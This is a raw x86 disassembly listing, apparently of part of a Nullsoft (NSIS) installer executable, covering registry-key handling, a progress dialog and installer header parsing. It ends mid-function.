  402bd6:	40                   	inc    %eax
  402bd7:	00 91 14 40 00 9d    	add    %dl,-0x62ffbfec(%ecx)
  402bdd:	14 40                	adc    $0x40,%al
  402bdf:	00 b8 14 40 00 cb    	add    %bh,-0x34ffbfec(%eax)
  402be5:	14 40                	adc    $0x40,%al
  402be7:	00 d7                	add    %dl,%bh
  402be9:	14 40                	adc    $0x40,%al
  402beb:	00 f5                	add    %dh,%ch
  402bed:	14 40                	adc    $0x40,%al
  402bef:	00 73 15             	add    %dh,0x15(%ebx)
  402bf2:	40                   	inc    %eax
  402bf3:	00 a3 15 40 00 c1    	add    %ah,-0x3effbfeb(%ebx)
  402bf9:	15 40 00 6a 16       	adc    $0x166a0040,%eax
  402bfe:	40                   	inc    %eax
  402bff:	00 03                	add    %al,(%ebx)
  402c01:	15 40 00 42 15       	adc    $0x15420040,%eax
  402c06:	40                   	inc    %eax
  402c07:	00 63 15             	add    %ah,0x15(%ebx)
  402c0a:	40                   	inc    %eax
  402c0b:	00 7b 16             	add    %bh,0x16(%ebx)
  402c0e:	40                   	inc    %eax
  402c0f:	00 cc                	add    %cl,%ah
  402c11:	16                   	push   %ss
  402c12:	40                   	inc    %eax
  402c13:	00 35 17 40 00 5c    	add    %dh,0x5c004017
  402c19:	17                   	pop    %ss
  402c1a:	40                   	inc    %eax
  402c1b:	00 6f 17             	add    %ch,0x17(%edi)
  402c1e:	40                   	inc    %eax
  402c1f:	00 0c 19             	add    %cl,(%ecx,%ebx,1)
  402c22:	40                   	inc    %eax
  402c23:	00 0f                	add    %cl,(%edi)
  402c25:	19 40 00             	sbb    %eax,0x0(%eax)
  402c28:	41                   	inc    %ecx
  402c29:	19 40 00             	sbb    %eax,0x0(%eax)
  402c2c:	56                   	push   %esi
  402c2d:	19 40 00             	sbb    %eax,0x0(%eax)
  402c30:	68 19 40 00 ff       	push   $0xff004019
  402c35:	19 40 00             	sbb    %eax,0x0(%eax)
  402c38:	30 1a                	xor    %bl,(%edx)
  402c3a:	40                   	inc    %eax
  402c3b:	00 72 1a             	add    %dh,0x1a(%edx)
  402c3e:	40                   	inc    %eax
  402c3f:	00 b2 1a 40 00 77    	add    %dh,0x7700401a(%edx)
  402c45:	1b 40 00             	sbb    0x0(%eax),%eax
  402c48:	9b                   	fwait
  402c49:	1b 40 00             	sbb    0x0(%eax),%eax
  402c4c:	43                   	inc    %ebx
  402c4d:	1c 40                	sbb    $0x40,%al
  402c4f:	00 43 1c             	add    %al,0x1c(%ebx)
  402c52:	40                   	inc    %eax
  402c53:	00 17                	add    %dl,(%edi)
  402c55:	1d 40 00 38 1d       	sbb    $0x1d380040,%eax
  402c5a:	40                   	inc    %eax
  402c5b:	00 5d 1d             	add    %bl,0x1d(%ebp)
  402c5e:	40                   	inc    %eax
  402c5f:	00 81 1d 40 00 4e    	add    %al,0x4e00401d(%ecx)
  402c65:	1e                   	push   %ds
  402c66:	40                   	inc    %eax
  402c67:	00 de                	add    %bl,%dh
  402c69:	1e                   	push   %ds
  402c6a:	40                   	inc    %eax
  402c6b:	00 12                	add    %dl,(%edx)
  402c6d:	1f                   	pop    %ds
  402c6e:	40                   	inc    %eax
  402c6f:	00 a4 1f 40 00 f6 1f 	add    %ah,0x1ff60040(%edi,%ebx,1)
  402c76:	40                   	inc    %eax
  402c77:	00 2a                	add    %ch,(%edx)
  402c79:	20 40 00             	and    %al,0x0(%eax)
  402c7c:	cf                   	iret
  402c7d:	20 40 00             	and    %al,0x0(%eax)
  402c80:	a2 21 40 00 f7       	mov    %al,0xf7004021
  402c85:	22 40 00             	and    0x0(%eax),%al
  402c88:	7b 23                	jnp    0x402cad
  402c8a:	40                   	inc    %eax
  402c8b:	00 aa 23 40 00 ec    	add    %ch,-0x13ffbfdd(%edx)
  402c91:	23 40 00             	and    0x0(%eax),%eax
  402c94:	2c 24                	sub    $0x24,%al
  402c96:	40                   	inc    %eax
  402c97:	00 82 24 40 00 22    	add    %al,0x22004024(%edx)
  402c9d:	25 40 00 96 25       	and    $0x25960040,%eax
  402ca2:	40                   	inc    %eax
  402ca3:	00 00                	add    %al,(%eax)
  402ca5:	26 40                	es inc %eax
  402ca7:	00 14 26             	add    %dl,(%esi,%eiz,1)
  402caa:	40                   	inc    %eax
  402cab:	00 36                	add    %dh,(%esi)
  402cad:	26 40                	es inc %eax
  402caf:	00 e4                	add    %ah,%ah
  402cb1:	26 40                	es inc %eax
  402cb3:	00 87 28 40 00 bb    	add    %al,-0x44ffbfd8(%edi)
  402cb9:	28 40 00             	sub    %al,0x0(%eax)
  402cbc:	d5 28                	aad    $0x28
  402cbe:	40                   	inc    %eax
  402cbf:	00 02                	add    %al,(%edx)
  402cc1:	29 40 00             	sub    %eax,0x0(%eax)
  402cc4:	47                   	inc    %edi
  402cc5:	29 40 00             	sub    %eax,0x0(%eax)
  402cc8:	42                   	inc    %edx
  402cc9:	2a 40 00             	sub    0x0(%eax),%al
  402ccc:	cf                   	iret
  402ccd:	2a 40 00             	sub    0x0(%eax),%al
  402cd0:	43                   	inc    %ebx
  402cd1:	2b 40 00             	sub    0x0(%eax),%eax
  402cd4:	c2 2b 40             	ret    $0x402b
  402cd7:	00 9d 2b 40 00 36    	add    %bl,0x3600402b(%ebp)
  402cdd:	26 40                	es inc %eax
  402cdf:	00 e4                	add    %ah,%ah
  402ce1:	26 40                	es inc %eax
  402ce3:	00 e2                	add    %ah,%dl
  402ce5:	1a 40 00             	sbb    0x0(%eax),%al
  402ce8:	e9 1a 40 00 f0       	jmp    0xf0406d07
  402ced:	1a 40 00             	sbb    0x0(%eax),%al
  402cf0:	f5                   	cmc
  402cf1:	1a 40 00             	sbb    0x0(%eax),%al
  402cf4:	05 1b 40 00 09       	add    $0x900401b,%eax
  402cf9:	1b 40 00             	sbb    0x0(%eax),%eax
  402cfc:	0d 1b 40 00 16       	or     $0x1600401b,%eax
  402d01:	1b 40 00             	sbb    0x0(%eax),%eax
  402d04:	1f                   	pop    %ds
  402d05:	1b 40 00             	sbb    0x0(%eax),%eax
  402d08:	2c 1b                	sub    $0x1b,%al
  402d0a:	40                   	inc    %eax
  402d0b:	00 3c 1b             	add    %bh,(%ebx,%ebx,1)
  402d0e:	40                   	inc    %eax
  402d0f:	00 5a 1b             	add    %bl,0x1b(%edx)
  402d12:	40                   	inc    %eax
  402d13:	00 61 1b             	add    %ah,0x1b(%ecx)
  402d16:	40                   	inc    %eax
  402d17:	00 68 1b             	add    %ch,0x1b(%eax)
  402d1a:	40                   	inc    %eax
  402d1b:	00 8b 44 24 04 8b    	add    %cl,-0x74fbdbbc(%ebx)
  402d21:	0d 54 ce 40 00       	or     $0x40ce54,%eax
  402d26:	56                   	push   %esi
  402d27:	ff 34 81             	push   (%ecx,%eax,4)
  402d2a:	6a 00                	push   $0x0
  402d2c:	e8 48 38 00 00       	call   0x406579
  402d31:	8b f0                	mov    %eax,%esi
  402d33:	56                   	push   %esi
  402d34:	e8 63 37 00 00       	call   0x40649c
  402d39:	0f b7 16             	movzwl (%esi),%edx
  402d3c:	5e                   	pop    %esi
  402d3d:	c3                   	ret
  402d3e:	56                   	push   %esi
  402d3f:	8b 74 24 08          	mov    0x8(%esp),%esi
  402d43:	85 f6                	test   %esi,%esi
  402d45:	57                   	push   %edi
  402d46:	8b c6                	mov    %esi,%eax
  402d48:	7d 02                	jge    0x402d4c
  402d4a:	f7 d8                	neg    %eax
  402d4c:	8b 15 54 ce 40 00    	mov    0x40ce54,%edx
  402d52:	8b c8                	mov    %eax,%ecx
  402d54:	83 e1 0f             	and    $0xf,%ecx
  402d57:	c1 f8 04             	sar    $0x4,%eax
  402d5a:	ff 34 8a             	push   (%edx,%ecx,4)
  402d5d:	c1 e0 0b             	shl    $0xb,%eax
  402d60:	05 f8 a5 40 00       	add    $0x40a5f8,%eax
  402d65:	50                   	push   %eax
  402d66:	e8 0e 38 00 00       	call   0x406579
  402d6b:	85 f6                	test   %esi,%esi
  402d6d:	8b f8                	mov    %eax,%edi
  402d6f:	7d 06                	jge    0x402d77
  402d71:	57                   	push   %edi
  402d72:	e8 74 3a 00 00       	call   0x4067eb
  402d77:	8b c7                	mov    %edi,%eax
  402d79:	5f                   	pop    %edi
  402d7a:	5e                   	pop    %esi
  402d7b:	c2 04 00             	ret    $0x4
  402d7e:	55                   	push   %ebp
  402d7f:	8b ec                	mov    %esp,%ebp
  402d81:	8d 45 08             	lea    0x8(%ebp),%eax
  402d84:	50                   	push   %eax
  402d85:	8b 45 08             	mov    0x8(%ebp),%eax
  402d88:	0d 20 00 10 00       	or     $0x100020,%eax
  402d8d:	50                   	push   %eax
  402d8e:	6a 22                	push   $0x22
  402d90:	e8 a9 ff ff ff       	call   0x402d3e
  402d95:	50                   	push   %eax
  402d96:	a1 54 ce 40 00       	mov    0x40ce54,%eax
  402d9b:	ff 70 04             	push   0x4(%eax)
  402d9e:	e8 13 00 00 00       	call   0x402db6
  402da3:	50                   	push   %eax
  402da4:	e8 00 36 00 00       	call   0x4063a9
  402da9:	f7 d8                	neg    %eax
  402dab:	1b c0                	sbb    %eax,%eax
  402dad:	f7 d0                	not    %eax
  402daf:	23 45 08             	and    0x8(%ebp),%eax
  402db2:	5d                   	pop    %ebp
  402db3:	c2 04 00             	ret    $0x4
  402db6:	8b 44 24 04          	mov    0x4(%esp),%eax
  402dba:	85 c0                	test   %eax,%eax
  402dbc:	7c 0d                	jl     0x402dcb
  402dbe:	8b 0d 04 a3 42 00    	mov    0x42a304,%ecx
  402dc4:	8d 84 01 01 00 00 80 	lea    -0x7fffffff(%ecx,%eax,1),%eax
  402dcb:	c2 04 00             	ret    $0x4
  402dce:	55                   	push   %ebp
  402dcf:	8b ec                	mov    %esp,%ebp
  402dd1:	8d 45 10             	lea    0x10(%ebp),%eax
  402dd4:	50                   	push   %eax
  402dd5:	8b 45 10             	mov    0x10(%ebp),%eax
  402dd8:	0d 20 00 10 00       	or     $0x100020,%eax
  402ddd:	50                   	push   %eax
  402dde:	ff 75 0c             	push   0xc(%ebp)
  402de1:	ff 75 08             	push   0x8(%ebp)
  402de4:	e8 cd ff ff ff       	call   0x402db6
  402de9:	50                   	push   %eax
  402dea:	e8 e8 35 00 00       	call   0x4063d7
  402def:	f7 d8                	neg    %eax
  402df1:	1b c0                	sbb    %eax,%eax
  402df3:	f7 d0                	not    %eax
  402df5:	23 45 10             	and    0x10(%ebp),%eax
  402df8:	5d                   	pop    %ebp
  402df9:	c2 0c 00             	ret    $0xc
  402dfc:	55                   	push   %ebp
  402dfd:	8b ec                	mov    %esp,%ebp
  402dff:	56                   	push   %esi
  402e00:	8b 75 0c             	mov    0xc(%ebp),%esi
  402e03:	66 83 3e 00          	cmpw   $0x0,(%esi)
  402e07:	75 07                	jne    0x402e10
  402e09:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402e0e:	eb 2c                	jmp    0x402e3c
  402e10:	81 4d 10 20 00 10 00 	orl    $0x100020,0x10(%ebp)
  402e17:	8d 45 10             	lea    0x10(%ebp),%eax
  402e1a:	50                   	push   %eax
  402e1b:	ff 75 08             	push   0x8(%ebp)
  402e1e:	e8 93 ff ff ff       	call   0x402db6
  402e23:	50                   	push   %eax
  402e24:	e8 05 35 00 00       	call   0x40632e
  402e29:	85 c0                	test   %eax,%eax
  402e2b:	74 0c                	je     0x402e39
  402e2d:	ff 75 10             	push   0x10(%ebp)
  402e30:	56                   	push   %esi
  402e31:	50                   	push   %eax
  402e32:	e8 0a 00 00 00       	call   0x402e41
  402e37:	eb 03                	jmp    0x402e3c
  402e39:	6a 06                	push   $0x6
  402e3b:	58                   	pop    %eax
  402e3c:	5e                   	pop    %esi
  402e3d:	5d                   	pop    %ebp
  402e3e:	c2 0c 00             	ret    $0xc
  402e41:	55                   	push   %ebp
  402e42:	8b ec                	mov    %esp,%ebp
  402e44:	81 ec 14 02 00 00    	sub    $0x214,%esp
  402e4a:	53                   	push   %ebx
  402e4b:	56                   	push   %esi
  402e4c:	8b 75 10             	mov    0x10(%ebp),%esi
  402e4f:	57                   	push   %edi
  402e50:	8b fe                	mov    %esi,%edi
  402e52:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402e55:	81 e6 00 03 00 00    	and    $0x300,%esi
  402e5b:	50                   	push   %eax
  402e5c:	8b c6                	mov    %esi,%eax
  402e5e:	83 e7 01             	and    $0x1,%edi
  402e61:	0c 09                	or     $0x9,%al
  402e63:	50                   	push   %eax
  402e64:	ff 75 0c             	push   0xc(%ebp)
  402e67:	ff 75 08             	push   0x8(%ebp)
  402e6a:	e8 3a 35 00 00       	call   0x4063a9
  402e6f:	33 db                	xor    %ebx,%ebx
  402e71:	3b c3                	cmp    %ebx,%eax
  402e73:	0f 85 ab 00 00 00    	jne    0x402f24
  402e79:	f6 45 10 02          	testb  $0x2,0x10(%ebp)
  402e7d:	74 23                	je     0x402ea2
  402e7f:	53                   	push   %ebx
  402e80:	53                   	push   %ebx
  402e81:	53                   	push   %ebx
  402e82:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402e85:	53                   	push   %ebx
  402e86:	50                   	push   %eax
  402e87:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402e8d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402e90:	50                   	push   %eax
  402e91:	53                   	push   %ebx
  402e92:	ff 75 fc             	push   -0x4(%ebp)
  402e95:	ff 15 30 80 40 00    	call   *0x408030
  402e9b:	3d 03 01 00 00       	cmp    $0x103,%eax
  402ea0:	75 67                	jne    0x402f09
  402ea2:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402ea8:	68 05 01 00 00       	push   $0x105
  402ead:	50                   	push   %eax
  402eae:	53                   	push   %ebx
  402eaf:	8b 1d 04 80 40 00    	mov    0x408004,%ebx
  402eb5:	eb 27                	jmp    0x402ede
  402eb7:	85 ff                	test   %edi,%edi
  402eb9:	75 4e                	jne    0x402f09
  402ebb:	ff 75 10             	push   0x10(%ebp)
  402ebe:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402ec4:	50                   	push   %eax
  402ec5:	ff 75 fc             	push   -0x4(%ebp)
  402ec8:	e8 74 ff ff ff       	call   0x402e41
  402ecd:	85 c0                	test   %eax,%eax
  402ecf:	75 16                	jne    0x402ee7
  402ed1:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402ed7:	68 05 01 00 00       	push   $0x105
  402edc:	50                   	push   %eax
  402edd:	57                   	push   %edi
  402ede:	ff 75 fc             	push   -0x4(%ebp)
  402ee1:	ff d3                	call   *%ebx
  402ee3:	85 c0                	test   %eax,%eax
  402ee5:	74 d0                	je     0x402eb7
  402ee7:	ff 75 fc             	push   -0x4(%ebp)
  402eea:	ff 15 10 80 40 00    	call   *0x408010
  402ef0:	6a 03                	push   $0x3
  402ef2:	e8 3a 3a 00 00       	call   0x406931
  402ef7:	85 c0                	test   %eax,%eax
  402ef9:	75 1e                	jne    0x402f19
  402efb:	ff 75 0c             	push   0xc(%ebp)
  402efe:	ff 75 08             	push   0x8(%ebp)
  402f01:	ff 15 18 80 40 00    	call   *0x408018
  402f07:	eb 1b                	jmp    0x402f24
  402f09:	ff 75 fc             	push   -0x4(%ebp)
  402f0c:	ff 15 10 80 40 00    	call   *0x408010
  402f12:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402f17:	eb 0b                	jmp    0x402f24
  402f19:	6a 00                	push   $0x0
  402f1b:	56                   	push   %esi
  402f1c:	ff 75 0c             	push   0xc(%ebp)
  402f1f:	ff 75 08             	push   0x8(%ebp)
  402f22:	ff d0                	call   *%eax
  402f24:	5f                   	pop    %edi
  402f25:	5e                   	pop    %esi
  402f26:	5b                   	pop    %ebx
  402f27:	c9                   	leave
  402f28:	c2 0c 00             	ret    $0xc
  402f2b:	55                   	push   %ebp
  402f2c:	8b ec                	mov    %esp,%ebp
  402f2e:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402f34:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402f3b:	75 19                	jne    0x402f56
  402f3d:	6a 00                	push   $0x0
  402f3f:	68 fa 00 00 00       	push   $0xfa
  402f44:	6a 01                	push   $0x1
  402f46:	ff 75 08             	push   0x8(%ebp)
  402f49:	ff 15 40 82 40 00    	call   *0x408240
  402f4f:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402f56:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402f5d:	75 45                	jne    0x402fa4
  402f5f:	e8 46 00 00 00       	call   0x402faa
  402f64:	83 3d 74 a2 42 00 00 	cmpl   $0x0,0x42a274
  402f6b:	b9 54 a0 40 00       	mov    $0x40a054,%ecx
  402f70:	75 05                	jne    0x402f77
  402f72:	b9 20 a0 40 00       	mov    $0x40a020,%ecx
  402f77:	50                   	push   %eax
  402f78:	8d 45 80             	lea    -0x80(%ebp),%eax
  402f7b:	51                   	push   %ecx
  402f7c:	50                   	push   %eax
  402f7d:	ff 15 54 82 40 00    	call   *0x408254
  402f83:	83 c4 0c             	add    $0xc,%esp
  402f86:	8d 45 80             	lea    -0x80(%ebp),%eax
  402f89:	50                   	push   %eax
  402f8a:	ff 75 08             	push   0x8(%ebp)
  402f8d:	ff 15 44 82 40 00    	call   *0x408244
  402f93:	8d 45 80             	lea    -0x80(%ebp),%eax
  402f96:	50                   	push   %eax
  402f97:	68 06 04 00 00       	push   $0x406
  402f9c:	ff 75 08             	push   0x8(%ebp)
  402f9f:	e8 dc 2b 00 00       	call   0x405b80
  402fa4:	33 c0                	xor    %eax,%eax
  402fa6:	c9                   	leave
  402fa7:	c2 10 00             	ret    $0x10
  402faa:	8b 0d f0 0e 42 00    	mov    0x420ef0,%ecx
  402fb0:	a1 00 0f 42 00       	mov    0x420f00,%eax
  402fb5:	3b c8                	cmp    %eax,%ecx
  402fb7:	72 02                	jb     0x402fbb
  402fb9:	8b c8                	mov    %eax,%ecx
  402fbb:	50                   	push   %eax
  402fbc:	6a 64                	push   $0x64
  402fbe:	51                   	push   %ecx
  402fbf:	ff 15 fc 80 40 00    	call   *0x4080fc
  402fc5:	c3                   	ret
  402fc6:	55                   	push   %ebp
  402fc7:	8b ec                	mov    %esp,%ebp
  402fc9:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402fcf:	56                   	push   %esi
  402fd0:	33 f6                	xor    %esi,%esi
  402fd2:	39 75 08             	cmp    %esi,0x8(%ebp)
  402fd5:	74 18                	je     0x402fef
  402fd7:	a1 fc 0e 42 00       	mov    0x420efc,%eax
  402fdc:	3b c6                	cmp    %esi,%eax
  402fde:	74 07                	je     0x402fe7
  402fe0:	50                   	push   %eax
  402fe1:	ff 15 38 82 40 00    	call   *0x408238
  402fe7:	89 35 fc 0e 42 00    	mov    %esi,0x420efc
  402fed:	eb 76                	jmp    0x403065
  402fef:	39 35 fc 0e 42 00    	cmp    %esi,0x420efc
  402ff5:	74 08                	je     0x402fff
  402ff7:	56                   	push   %esi
  402ff8:	e8 70 39 00 00       	call   0x40696d
  402ffd:	eb 66                	jmp    0x403065
  402fff:	ff 15 f8 80 40 00    	call   *0x4080f8
  403005:	3b 05 70 a2 42 00    	cmp    0x42a270,%eax
  40300b:	76 58                	jbe    0x403065
  40300d:	39 35 68 a2 42 00    	cmp    %esi,0x42a268
  403013:	74 2d                	je     0x403042
  403015:	f6 05 34 a3 42 00 01 	testb  $0x1,0x42a334
  40301c:	74 47                	je     0x403065
  40301e:	e8 87 ff ff ff       	call   0x402faa
  403023:	50                   	push   %eax
  403024:	8d 45 80             	lea    -0x80(%ebp),%eax
  403027:	68 80 a0 40 00       	push   $0x40a080
  40302c:	50                   	push   %eax
  40302d:	ff 15 54 82 40 00    	call   *0x408254
  403033:	83 c4 0c             	add    $0xc,%esp
  403036:	8d 45 80             	lea    -0x80(%ebp),%eax
  403039:	50                   	push   %eax
  40303a:	56                   	push   %esi
  40303b:	e8 64 25 00 00       	call   0x4055a4
  403040:	eb 23                	jmp    0x403065
  403042:	56                   	push   %esi
  403043:	68 2b 2f 40 00       	push   $0x402f2b
  403048:	56                   	push   %esi
  403049:	6a 6f                	push   $0x6f
  40304b:	ff 35 60 a2 42 00    	push   0x42a260
  403051:	ff 15 3c 82 40 00    	call   *0x40823c
  403057:	6a 05                	push   $0x5
  403059:	50                   	push   %eax
  40305a:	a3 fc 0e 42 00       	mov    %eax,0x420efc
  40305f:	ff 15 50 82 40 00    	call   *0x408250
  403065:	5e                   	pop    %esi
  403066:	c9                   	leave
  403067:	c3                   	ret
  403068:	55                   	push   %ebp
  403069:	8b ec                	mov    %esp,%ebp
  40306b:	81 ec 2c 02 00 00    	sub    $0x22c,%esp
  403071:	53                   	push   %ebx
  403072:	56                   	push   %esi
  403073:	33 db                	xor    %ebx,%ebx
  403075:	57                   	push   %edi
  403076:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  403079:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40307c:	ff 15 f8 80 40 00    	call   *0x4080f8
  403082:	be 00 88 43 00       	mov    $0x438800,%esi
  403087:	68 00 04 00 00       	push   $0x400
  40308c:	05 e8 03 00 00       	add    $0x3e8,%eax
  403091:	56                   	push   %esi
  403092:	53                   	push   %ebx
  403093:	a3 70 a2 42 00       	mov    %eax,0x42a270
  403098:	ff 15 ec 80 40 00    	call   *0x4080ec
  40309e:	6a 03                	push   $0x3
  4030a0:	68 00 00 00 80       	push   $0x80000000
  4030a5:	56                   	push   %esi
  4030a6:	e8 87 2f 00 00       	call   0x406032
  4030ab:	8b f8                	mov    %eax,%edi
  4030ad:	83 ff ff             	cmp    $0xffffffff,%edi
  4030b0:	89 3d 18 a0 40 00    	mov    %edi,0x40a018
  4030b6:	75 0a                	jne    0x4030c2
  4030b8:	b8 b8 a2 40 00       	mov    $0x40a2b8,%eax
  4030bd:	e9 40 02 00 00       	jmp    0x403302
  4030c2:	56                   	push   %esi
  4030c3:	be 00 68 43 00       	mov    $0x436800,%esi
  4030c8:	56                   	push   %esi
  4030c9:	e8 6e 34 00 00       	call   0x40653c
  4030ce:	56                   	push   %esi
  4030cf:	e8 89 2d 00 00       	call   0x405e5d
  4030d4:	50                   	push   %eax
  4030d5:	68 00 90 43 00       	push   $0x439000
  4030da:	e8 5d 34 00 00       	call   0x40653c
  4030df:	53                   	push   %ebx
  4030e0:	57                   	push   %edi
  4030e1:	ff 15 f0 80 40 00    	call   *0x4080f0
  4030e7:	3b c3                	cmp    %ebx,%eax
  4030e9:	a3 00 0f 42 00       	mov    %eax,0x420f00
  4030ee:	8b f0                	mov    %eax,%esi
  4030f0:	0f 86 e5 00 00 00    	jbe    0x4031db
  4030f6:	bb f0 8e 41 00       	mov    $0x418ef0,%ebx
  4030fb:	a1 78 a2 42 00       	mov    0x42a278,%eax
  403100:	8b fe                	mov    %esi,%edi
  403102:	f7 d8                	neg    %eax
  403104:	1b c0                	sbb    %eax,%eax
  403106:	25 00 7e 00 00       	and    $0x7e00,%eax
  40310b:	05 00 02 00 00       	add    $0x200,%eax
  403110:	3b f0                	cmp    %eax,%esi
  403112:	72 02                	jb     0x403116
  403114:	8b f8                	mov    %eax,%edi
  403116:	57                   	push   %edi
  403117:	53                   	push   %ebx
  403118:	e8 5d 04 00 00       	call   0x40357a
  40311d:	85 c0                	test   %eax,%eax
  40311f:	0f 84 51 01 00 00    	je     0x403276
  403125:	83 3d 78 a2 42 00 00 	cmpl   $0x0,0x42a278
  40312c:	75 7a                	jne    0x4031a8
  40312e:	6a 1c                	push   $0x1c
  403130:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403133:	53                   	push   %ebx
  403134:	50                   	push   %eax
  403135:	e8 b3 2e 00 00       	call   0x405fed
  40313a:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40313d:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  403142:	75 72                	jne    0x4031b6
  403144:	81 7d e0 ef be ad de 	cmpl   $0xdeadbeef,-0x20(%ebp)
  40314b:	75 69                	jne    0x4031b6
  40314d:	81 7d ec 49 6e 73 74 	cmpl   $0x74736e49,-0x14(%ebp)
  403154:	75 60                	jne    0x4031b6
  403156:	81 7d e8 73 6f 66 74 	cmpl   $0x74666f73,-0x18(%ebp)
  40315d:	75 57                	jne    0x4031b6
  40315f:	81 7d e4 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x1c(%ebp)
  403166:	75 4e                	jne    0x4031b6
  403168:	09 45 08             	or     %eax,0x8(%ebp)
  40316b:	8b 45 08             	mov    0x8(%ebp),%eax
  40316e:	8b 0d f0 0e 42 00    	mov    0x420ef0,%ecx
  403174:	83 e0 02             	and    $0x2,%eax
  403177:	09 05 20 a3 42 00    	or     %eax,0x42a320
  40317d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403180:	3b c6                	cmp    %esi,%eax
  403182:	89 0d 78 a2 42 00    	mov    %ecx,0x42a278
  403188:	0f 87 2c 01 00 00    	ja     0x4032ba
  40318e:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  403192:	75 06                	jne    0x40319a
  403194:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  403198:	75 3f                	jne    0x4031d9
  40319a:	ff 45 f8             	incl   -0x8(%ebp)
  40319d:	8d 70 fc             	lea    -0x4(%eax),%esi
  4031a0:	3b fe                	cmp    %esi,%edi
  4031a2:	76 12                	jbe    0x4031b6
  4031a4:	8b fe                	mov    %esi,%edi
  4031a6:	eb 0e                	jmp    0x4031b6
  4031a8:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  4031ac:	75 08                	jne    0x4031b6
  4031ae:	6a 00                	push   $0x0
  4031b0:	e8 11 fe ff ff       	call   0x402fc6
  4031b5:	59                   	pop    %ecx
  4031b6:	3b 35 00 0f 42 00    	cmp    0x420f00,%esi
  4031bc:	73 0d                	jae    0x4031cb
  4031be:	57                   	push   %edi
  4031bf:	53                   	push   %ebx
  4031c0:	ff 75 fc             	push   -0x4(%ebp)
  4031c3:	e8 56 38 00 00       	call   0x406a1e
  4031c8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4031cb:	01 3d f0 0e 42 00    	add    %edi,0x420ef0
  4031d1:	2b f7                	sub    %edi,%esi
  4031d3:	0f 85 22 ff ff ff    	jne    0x4030fb
  4031d9:	33 db                	xor    %ebx,%ebx
  4031db:	6a 01                	push   $0x1
  4031dd:	e8 e4 fd ff ff       	call   0x402fc6
  4031e2:	39 1d 78 a2 42 00    	cmp    %ebx,0x42a278
  4031e8:	59                   	pop    %ecx
  4031e9:	0f 84 cb 00 00 00    	je     0x4032ba
  4031ef:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4031f2:	74 2a                	je     0x40321e
  4031f4:	ff 35 f0 0e 42 00    	push   0x420ef0
  4031fa:	e8 91 03 00 00       	call   0x403590
  4031ff:	8d 45 08             	lea    0x8(%ebp),%eax
  403202:	6a 04                	push   $0x4
  403204:	50                   	push   %eax
  403205:	e8 70 03 00 00       	call   0x40357a
  40320a:	85 c0                	test   %eax,%eax
  40320c:	0f 84 a8 00 00 00    	je     0x4032ba
  403212:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403215:	3b 45 08             	cmp    0x8(%ebp),%eax
  403218:	0f 85 9c 00 00 00    	jne    0x4032ba
  40321e:	ff 75 f0             	push   -0x10(%ebp)
  403221:	6a 40                	push   $0x40
  403223:	ff 15 38 81 40 00    	call   *0x408138
  403229:	b9 68 ce 40 00       	mov    $0x40ce68,%ecx
  40322e:	8b f0                	mov    %eax,%esi
  403230:	e8 57 38 00 00       	call   0x406a8c
  403235:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  40323b:	68 00 78 43 00       	push   $0x437800
  403240:	50                   	push   %eax
  403241:	e8 1b 2e 00 00       	call   0x406061
  403246:	53                   	push   %ebx
  403247:	68 00 01 00 04       	push   $0x4000100
  40324c:	6a 02                	push   $0x2
  40324e:	53                   	push   %ebx
  40324f:	53                   	push   %ebx
  403250:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  403256:	68 00 00 00 c0       	push   $0xc0000000
  40325b:	50                   	push   %eax
  40325c:	ff 15 f4 80 40 00    	call   *0x4080f4
  403262:	83 f8 ff             	cmp    $0xffffffff,%eax
  403265:	a3 1c a0 40 00       	mov    %eax,0x40a01c
  40326a:	75 14                	jne    0x403280
  40326c:	b8 30 a2 40 00       	mov    $0x40a230,%eax
  403271:	e9 8c 00 00 00       	jmp    0x403302
  403276:	6a 01                	push   $0x1
  403278:	e8 49 fd ff ff       	call   0x402fc6
  40327d:	59                   	pop    %ecx
  40327e:	eb 3a                	jmp    0x4032ba
  403280:	a1 78 a2 42 00       	mov    0x42a278,%eax
  403285:	83 c0 1c             	add    $0x1c,%eax
  403288:	50                   	push   %eax
  403289:	e8 02 03 00 00       	call   0x403590
  40328e:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  403291:	ff 75 f0             	push   -0x10(%ebp)
  403294:	f7 d1                	not    %ecx
  403296:	83 e1 04             	and    $0x4,%ecx
  403299:	a3 04 0f 42 00       	mov    %eax,0x420f04
  40329e:	2b c1                	sub    %ecx,%eax
  4032a0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4032a3:	56                   	push   %esi
  4032a4:	53                   	push   %ebx
  4032a5:	8d 44 08 e4          	lea    -0x1c(%eax,%ecx,1),%eax
  4032a9:	6a ff                	push   $0xffffffff
  4032ab:	a3 f8 0e 42 00       	mov    %eax,0x420ef8
  4032b0:	e8 54 00 00 00       	call   0x403309
  4032b5:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  4032b8:	74 07                	je     0x4032c1
  4032ba:	b8 98 a0 40 00       	mov    $0x40a098,%eax
